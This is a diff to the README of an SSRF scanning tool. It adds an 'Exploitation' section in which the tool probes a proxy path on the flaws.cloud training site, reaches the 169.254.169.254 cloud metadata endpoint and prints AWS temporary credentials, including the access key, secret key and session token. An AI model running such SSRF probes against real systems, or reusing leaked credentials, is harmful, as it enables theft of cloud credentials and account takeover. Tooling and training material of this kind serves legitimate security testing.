@@ -76,7 +76,32 @@ To do so. Also, Make sure to customerise your patterns file for greater results.
             silent output
     ```
   
-    ![GitHub Logo](images/image.png)
+    **Exploitation**
+    
+    ```sh
+    end@root:~$ ./ssrftool -domains domains -paths=true -payloads payloads.txt -patterns patterns.txt
+
+
+    █▀ █▀ █▀█ █▀▀
+    ▄█ ▄█ █▀▄ █▀░
+
+        v1.2 - @z0idsec (fixed by @R0X4R)
+
+    [WRN] Use with caution. You are responsible for your actions
+    [WRN] Developers assume no liability and are not responsible for any misuse or damage.
+
+    >  Testing  http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy//169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
+    {
+      "Code" : "Success",
+      "LastUpdated" : "2021-02-10T03:03:06Z",
+      "Type" : "AWS-HMAC",
+      "AccessKeyId" : "ASIA6GG7PSQGZ6OYP77X",
+      "SecretAccessKey" : "48Qe7eyMwWzPz8FiwtH+RQIaDtZPZf1DVCEiMia9",
+      "Token" : "IQoJb3JpZ2luX2VjEKP//////////wEaCXVzLXdlc3QtMiJHMEUCIBnoKbpbPT/h7JXCay5G1ErKcTpB7xQNx07pz84Y18GBAiEAwAlKQPsog/ESCNoXGY1RMyJgJlK2Rq7gNoYjpVPxuAYqvQMInP//////////ARABGgw5NzU0MjYyNjIwMjkiDG1GDv5XTUNfbXAlJSqRAzFe/7GMnB9DakVDBXSbYfyOKtFiC1TG6wmgGZREXpvwveF2Yt9fjFE/NohaaZQP5HPJo/pXHRlVzIQ41I5RbacDhzsACvS5VJwU1mjAteQY/TRkL+5qHYhM0bjDo1pqRCDvRuBmd5uC0OExkQCu55K4uo8qetjYYdfJ5pgPK2hKUyWYfHxwHa2JPNsst3L6oeRp8bzDk3DNipsFan9S0Umz/rfP1rRziUfKKRDBPyzx0wpjtFdC5yjV+O1UMLZ2Qn1ANmp/Otr3UhYu2ssdR/a9a+kE6pi0Qmi/JKfz/6ovIafXm8/a6gisIqEHZ02TrserNdccwqcbNP7mRCFFJzjp93bJkK30xLa7LMOkY4HSYoFyyPSOibAK5XX/mnlxKxQvK2r+mvvelUglEGe9m59Dp+OhYrhFXTvABNy64AnrvsJRA06D5o0nZECL39JuEYfUj1gKHYjL7iS5GfmPqGhIx9zzpC6UB0veh3UQhCqMz0GxqfHoYa+jfei2hYbe/QJVrme0OwGxz8l1qmumF7ohML+ZjYEGOusBlnslmeGXBJN/sGYhqCXXKzyX6oBmW5avOgp8ztsMTPMVICgA4nTep1ZN/q9hyB7CkdZ1GjWoHCCfd+MqxEEszxVawtrMFZSmx82OlfIfB13JQr95Ezk0FhrPu2TsARWUQTPWpXtu9kMFr36CHUqBCQ2agZhhoYk6brjz9I4d0gz4Qj1rY/ZB69rYGALRgty8cTJLGcwJ5CRddoeaiodBsroui19w5NyC3S3oRHP49rYAY8cYqCGGvTvwtbk1H6+p+dkC22wBlMsY/uwdGr6hnaVHYCc3Pr1ewIj/9iuYloEJOHweJy7uRl8dSA==",
+      "Expiration" : "2021-02-10T09:26:50Z"
+    }
+    VULNERABLE: http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy//169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
+    ```
 
 
 + **Find SSRF in paths with Subfinder, httpx**
